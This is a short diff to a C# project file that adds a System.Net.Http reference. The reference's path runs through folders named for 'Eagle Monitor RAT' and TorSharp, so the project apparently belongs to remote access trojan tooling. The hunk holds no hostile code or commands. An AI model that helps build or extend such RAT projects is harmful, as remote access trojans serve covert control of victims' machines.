@@ -43,6 +43,9 @@
       <HintPath>..\packages\starksoft.aspen.1.1.8\lib\net45\starksoft.aspen.dll</HintPath>
     </Reference>
     <Reference Include="System" />
+    <Reference Include="System.Net.Http">
+      <HintPath>..\..\..\..\..\..\DarkOracle2\Libraries\TorSharp\artifacts\Eagle Monitor RAT\Bridge\bin\Release\net45\System.Net.Http.dll</HintPath>
+    </Reference>
   </ItemGroup>
   <ItemGroup>
     <ProjectReference Include="..\Plugins\Offline\Offline.csproj">
